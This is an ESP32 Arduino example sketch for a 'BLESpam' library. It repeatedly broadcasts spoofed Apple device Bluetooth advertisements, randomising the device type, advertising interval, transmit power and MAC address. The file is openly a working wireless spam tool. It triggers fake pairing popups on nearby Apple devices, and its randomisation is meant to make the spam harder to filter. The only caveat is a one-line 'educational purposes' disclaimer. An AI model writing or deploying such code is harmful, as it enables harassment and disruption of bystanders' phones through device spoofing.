/**
 * RandomAppleSpam Example
 * 
 * This example demonstrates advanced usage of the BLESpam library
 * by randomly cycling through Apple devices with varying intervals
 * and TX power levels for more realistic spam patterns.
 * 
 * Compatible with ESP32 boards
 * 
 * Features:
 * - Random device selection
 * - Variable advertising intervals
 * - Dynamic TX power adjustment
 * - Random MAC address generation
 * 
 * DISCLAIMER: This is for educational purposes only. Use responsibly.
 */

#include <BLESpam.h>

BLESpam bleSpam;

// Configuration
const uint16_t MIN_INTERVAL = 50;   // Minimum interval in ms
const uint16_t MAX_INTERVAL = 200;  // Maximum interval in ms
const uint16_t SPAM_DURATION = 3000; // Duration per device in ms

// Statistics
unsigned long startTime = 0;
unsigned long deviceCount = 0;

void setup() {
    Serial.begin(115200);
    Serial.println("╔════════════════════════════════════════╗");
    Serial.println("║   BLESpam - Random Apple Device Spam  ║");
    Serial.println("╚════════════════════════════════════════╝");
    Serial.println();
    
    // Initialize random seed
    randomSeed(analogRead(0));
    
    // Initialize the BLE spam library
    if (!bleSpam.begin("ESP32-Random")) {
        Serial.println("❌ Failed to initialize BLE!");
        while(1) delay(1000);
    }
    
    Serial.println("✅ BLE initialized successfully!");
    Serial.println();
    
    // Initial configuration
    bleSpam.setRandomMac(true);
    
    startTime = millis();
    
    Serial.println("Starting random Apple device spam...");
    Serial.println("────────────────────────────────────────");
}

void loop() {
    // Select a random device
    uint8_t randomIndex = random(0, appleDevicesCount);
    AppleDeviceType device = appleDevices[randomIndex].type;
    const char* deviceName = appleDevices[randomIndex].name;
    
    // Random advertising interval
    uint16_t interval = random(MIN_INTERVAL, MAX_INTERVAL);
    bleSpam.setAdvertisingInterval(interval);
    
    // Random TX power (between -3 and 9 dBm)
    int8_t txPower = random(-3, 10);
    if (txPower > 9) txPower = 9;
    bleSpam.setTxPower(txPower);
    
    // Display info
    Serial.print("📱 Device: ");
    Serial.print(deviceName);
    Serial.print(" | Interval: ");
    Serial.print(interval);
    Serial.print("ms | Power: ");
    Serial.print(txPower);
    Serial.println(" dBm");
    
    // Start advertising
    bleSpam.advertiseAppleDevice(device);
    
    // Wait for spam duration
    delay(SPAM_DURATION);
    
    // Stop and prepare for next
    bleSpam.stop();
    delay(100);
    
    // Update statistics
    deviceCount++;
    
    // Print statistics every 10 devices
    if (deviceCount % 10 == 0) {
        unsigned long elapsed = (millis() - startTime) / 1000;
        Serial.println("────────────────────────────────────────");
        Serial.print("📊 Statistics | Devices: ");
        Serial.print(deviceCount);
        Serial.print(" | Runtime: ");
        Serial.print(elapsed);
        Serial.println(" seconds");
        Serial.println("────────────────────────────────────────");
    }
}
